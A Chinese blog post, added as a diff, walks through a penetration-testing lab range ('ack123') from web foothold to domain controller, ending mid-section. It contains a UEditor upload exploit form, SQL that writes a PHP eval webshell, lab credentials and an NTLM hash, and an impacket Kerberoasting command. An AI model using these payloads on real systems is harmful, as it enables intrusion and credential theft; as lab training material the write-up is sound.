@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            外网打点到内网域靶场-ack123 |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"The price of doing the same old thing is far higher than the price of change."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">外网打点到内网域靶场-ack123</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2023-10-05 13:50:30</span>
+        <span class="mobile">2023-10-05 13:50</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">完整渗透测试靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Ueditor%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">Ueditor任意文件上传</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93GetShell/">数据库GetShell</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JWTKey%E7%88%86%E7%A0%B4/">JWTKey爆破</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Kerberoasting/">Kerberoasting</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.7k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/10/05/ack123/image-20240120184141485.png" alt="image-20240120184141485"></p>
+<p>PS：该靶场作者：<a class="link" target="_blank" rel="noopener" href="https://www.moonsec.com/">暗月<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="HOSTS设置"><a href="#HOSTS设置" class="headerlink" title="HOSTS设置"></a>HOSTS设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	kali</span><br><span class="line">::1		localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1		ip6-allnodes</span><br><span class="line">ff02::2		ip6-allrouters</span><br><span class="line"><span class="comment"># 9-ack123</span></span><br><span class="line">192.168.0.207 www.ackmoon.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184205394.png" alt="image-20240120184205394"></p>
+<h1 id="WEB1服务器"><a href="#WEB1服务器" class="headerlink" title="WEB1服务器"></a>WEB1服务器</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O 192.168.0.207 -p-</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) </span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.ackmoon.com (192.168.0.207)</span><br><span class="line">Host is up (0.0048s latency).</span><br><span class="line">Not shown: 65517 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 8.5</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">999/tcp   open  http         Microsoft IIS httpd 8.5</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">6588/tcp  open  http         Microsoft IIS httpd 8.5</span><br><span class="line">10136/tcp open  unknown</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49159/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:10:B5:76 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2012|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_2012 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 201.32 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://www.ackmoon.com&quot;</span> -e php,htm,js,bak,zip,tar.gz,tgz,txt -r -R 1 -i 200-399</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, htm, js, bak, zip, tar.gz, tgz, txt | HTTP method: GET | Threads: 30 | Wordlist size: 12472</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.dirsearch/reports/www.ackmoon.com.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/kali/.dirsearch/logs/errors.log</span><br><span class="line"></span><br><span class="line">Target: http://www.ackmoon.com/</span><br><span class="line"></span><br><span class="line">[19:47:06] Starting: </span><br><span class="line">[19:47:11] 301 -  149B  - /js  -&gt;  http://www.ackmoon.com/js/     (Added to queue)</span><br><span class="line">[19:47:57] 301 -  152B  - /ADMIN  -&gt;  http://www.ackmoon.com/ADMIN/     (Added to queue)</span><br><span class="line">[19:47:58] 301 -  152B  - /Admin  -&gt;  http://www.ackmoon.com/Admin/     (Added to queue)</span><br><span class="line">[19:48:15] 301 -  157B  - /WebService  -&gt;  http://www.ackmoon.com/WebService/     (Added to queue)</span><br><span class="line">[19:48:39] 301 -  152B  - /admin  -&gt;  http://www.ackmoon.com/admin/     (Added to queue)</span><br><span class="line">[19:49:00] 302 -  134B  - /admin/?/login  -&gt;  /admin/login.aspx           </span><br><span class="line">[19:50:04] 301 -  150B  - /api  -&gt;  http://www.ackmoon.com/api/     (Added to queue)</span><br><span class="line">[19:50:45] 301 -  155B  - /database  -&gt;  http://www.ackmoon.com/database/     (Added to queue)</span><br><span class="line">[19:51:06] 200 -   17KB - /favicon.ico                                    </span><br><span class="line">[19:51:22] 301 -  153B  - /images  -&gt;  http://www.ackmoon.com/images/     (Added to queue)</span><br><span class="line">[19:52:05] 301 -  148B  - /m  -&gt;  http://www.ackmoon.com/m/     (Added to queue)</span><br><span class="line">[19:52:17] 301 -  153B  - /member  -&gt;  http://www.ackmoon.com/member/     (Added to queue)</span><br><span class="line">[19:52:18] 200 -    1B  - /member/                                        </span><br><span class="line">[19:53:20] 301 -  155B  - /template  -&gt;  http://www.ackmoon.com/template/     (Added to queue)</span><br><span class="line">[19:53:38] Starting: js/                                                  </span><br><span class="line">[19:55:28] 301 -  154B  - /js/code  -&gt;  http://www.ackmoon.com/js/code/   </span><br><span class="line">[19:58:22] Starting: ADMIN/                                                </span><br><span class="line">[20:03:27] 301 -  159B  - /ADMIN/images  -&gt;  http://www.ackmoon.com/ADMIN/images/</span><br><span class="line">[20:03:46] 301 -  157B  - /ADMIN/lang  -&gt;  http://www.ackmoon.com/ADMIN/lang/</span><br><span class="line">[20:05:44] 301 -  159B  - /ADMIN/themes  -&gt;  http://www.ackmoon.com/ADMIN/themes/</span><br><span class="line">[20:06:12] Starting: Admin/                                                </span><br><span class="line">[20:11:02] 301 -  159B  - /Admin/images  -&gt;  http://www.ackmoon.com/Admin/images/</span><br><span class="line">[20:11:14] 301 -  157B  - /Admin/lang  -&gt;  http://www.ackmoon.com/Admin/lang/</span><br><span class="line">[20:13:09] 301 -  159B  - /Admin/themes  -&gt;  http://www.ackmoon.com/Admin/themes/</span><br><span class="line">[20:13:48] Starting: WebService/                                           </span><br><span class="line">[20:20:32] Starting: admin/                                                </span><br><span class="line">[20:24:04] 301 -  159B  - /admin/images  -&gt;  http://www.ackmoon.com/admin/images/</span><br><span class="line">[20:24:14] 301 -  157B  - /admin/lang  -&gt;  http://www.ackmoon.com/admin/lang/</span><br><span class="line">[20:25:45] 301 -  159B  - /admin/themes  -&gt;  http://www.ackmoon.com/admin/themes/</span><br><span class="line">[20:26:17] Starting: api/                                                  </span><br><span class="line">[20:32:36] Starting: database/                                             </span><br><span class="line">[20:38:31] Starting: images/                                               </span><br><span class="line">[20:44:33] Starting: m/                                                    </span><br><span class="line">[20:46:37] 301 -  155B  - /m/images  -&gt;  http://www.ackmoon.com/m/images/   </span><br><span class="line">[20:47:26] Starting: member/                                                 </span><br><span class="line">[20:48:40] 301 -  160B  - /member/images  -&gt;  http://www.ackmoon.com/member/images/</span><br><span class="line">[20:49:30] Starting: template/                                               </span><br><span class="line">[20:49:54] 301 -  159B  - /template/aaa  -&gt;  http://www.ackmoon.com/template/aaa/</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>注册用户登录后，能看到网站使用组件等敏感信息。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184226188.png" alt="image-20240120184226188"></p>
+<p>搜索<code>ueditor 1.4.3</code>漏洞。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184236819.png" alt="image-20240120184236819"></p>
+<p><code>ueditor</code>路径查找：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184322492.png" alt="image-20240120184322492"></p>
+<p>修改HTML文件上传地址。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line"></span><br><span class="line">  &lt;inputtype=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184335912.png" alt="image-20240120184335912"></p>
+<p>冰蝎上线后执行命令：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184343294.png" alt="image-20240120184343294"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>利用冰蝎的反弹shell上线CS，SpoolSystem Injection 拿到系统权限。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184350443.png" alt="image-20240120184350443"></p>
+<p><img src="/2023/10/05/ack123/image-20240120184356097.png" alt="image-20240120184356097"></p>
+<h1 id="DATA1服务器"><a href="#DATA1服务器" class="headerlink" title="DATA1服务器"></a>DATA1服务器</h1><p>CS主机发现：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portscan 10.10.11.0-10.10.11.255 1-1024,3389,5000-6000 arp 1024</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184406662.png" alt="image-20240120184406662"></p>
+<p>查看网站配置文件，网站数据库机器是<code>10.10.11.137</code>。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184413417.png" alt="image-20240120184413417"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=&quot;HdhCmsConnStr&quot; value=&quot;user id=sa;password=pass123@.com;initial catalog=DemoHdhCms;data source=10.10.11.137&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在第一台机器创建<code>socks4</code>代理，使用<code>Multiple.Database.Utilization.Tools</code>连接代理。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184438027.png" alt="image-20240120184438027"></p>
+<p>CS上线，<code>SpoolSystem Injection</code>拿到系统权限。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184445519.png" alt="image-20240120184445519"></p>
+<h1 id="WEB2服务器"><a href="#WEB2服务器" class="headerlink" title="WEB2服务器"></a>WEB2服务器</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.135</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 985 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">80/tcp    open  http               Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)</span><br><span class="line">|_http-title: \xE6\xBC\x94\xE7\xA4\xBA\xEF\xBC\x9AJWT\xE5\xAE\x9E\xE6\x88\x98\xEF\xBC\x9A\xE4\xBD\xBF\xE7\x94\xA8axios+PHP\xE5\xAE\x9E\xE7\x8E\xB0\xE7\x99\xBB\xE5\xBD\x95\xE8\xAE\xA4\xE8\xAF\x81</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3306/tcp  open  mysql              MySQL (unauthorized)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: ACK123</span><br><span class="line">|   NetBIOS_Domain_Name: ACK123</span><br><span class="line">|   NetBIOS_Computer_Name: 12SERVER-WEB2</span><br><span class="line">|   DNS_Domain_Name: ack123.com</span><br><span class="line">|   DNS_Computer_Name: 12server-web2.ack123.com</span><br><span class="line">|   DNS_Tree_Name: ack123.com</span><br><span class="line">|   Product_Version: 6.3.9600</span><br><span class="line">|_  System_Time: 2024-01-20T06:00:26+00:00</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-01-20T06:00:46+00:00; 0s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=12server-web2.ack123.com</span><br><span class="line">| Not valid before: 2024-01-18T07:54:23</span><br><span class="line">|_Not valid after:  2024-07-19T07:54:23</span><br><span class="line">4444/tcp  open  krb524?</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49158/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49159/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   302: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-01-20T06:00:30</span><br><span class="line">|_  start_date: 2024-01-19T07:54:16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1378.94 seconds</span><br></pre></td></tr></table></figure>
+
+<p><code>JWTKey</code>爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNzA1NzI5NDU0LCJuYmYiOjE3MDU3Mjk0NjQsImV4cCI6MTcwNTczMDA1NCwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.ncRTbMWg-_t5CEinpHJQOKhWeyp1jtjTXTmJ6_xBjpE:Qweasdzxc5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184507152.png" alt="image-20240120184507152"></p>
+<p>80端口的Apache版本信息可能是phpstudy，遍历访问是否存在某个版本phpmyadmin：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wfuzz -w world1 -w world2 -w world3 --ss 200 http://10.10.11.135/phpmyadminFUZZ.FUZ2Z.FUZ3Z/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184622828.png" alt="image-20240120184622828"></p>
+<p>使用<code>jwt</code>破解的秘钥：<code>Qweasdzxc5</code>登录成功。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184630844.png" alt="image-20240120184630844"></p>
+<p>phpmyadmin写入一句话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> global general_log_file = <span class="string">&quot;c:/phpstudy_pro/www/x.php&quot;</span>;</span><br><span class="line">select <span class="string">&#x27;&lt;?php eval($_REQUEST[cmd]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184647649.png" alt="image-20240120184647649"></p>
+<p>系统权限，直接上线CS。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184653443.png" alt="image-20240120184653443"></p>
+<p><img src="/2023/10/05/ack123/image-20240120184658792.png" alt="image-20240120184658792"></p>
+<h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到WEB2后，查看到还有一个段。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184704912.png" alt="image-20240120184704912"></p>
+<p>进程查看存在域用户，进程注入域用户后，收集域信息。</p>
+<p><img src="/2023/10/05/ack123/image-20240120184712225.png" alt="image-20240120184712225"></p>
+<p>定位域控：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184719999.png" alt="image-20240120184719999"></p>
+<p><img src="/2023/10/05/ack123/image-20240120184730074.png" alt="image-20240120184730074"></p>
+<p>查询域内用户注册的SPN：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184753302.png" alt="image-20240120184753302"></p>
+<h2 id="Kerberoastiong"><a href="#Kerberoastiong" class="headerlink" title="Kerberoastiong"></a>Kerberoastiong</h2><p>请求所有用户SPN服务票据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python ../impacket-0.10.0/examples/GetUserSPNs.py -request -dc-ip 10.10.12.135 ack123.com/web2 -hashes :85b998a3d8f1904bc6f2d6b5f418be7e -outputfile hash.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184801051.png" alt="image-20240120184801051"></p>
+<p><img src="/2023/10/05/ack123/image-20240120184805665.png" alt="image-20240120184805665"></p>
+<p>Hashcat爆破：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184815762.png" alt="image-20240120184815762"></p>
+<p>拿到密码，上线CS：</p>
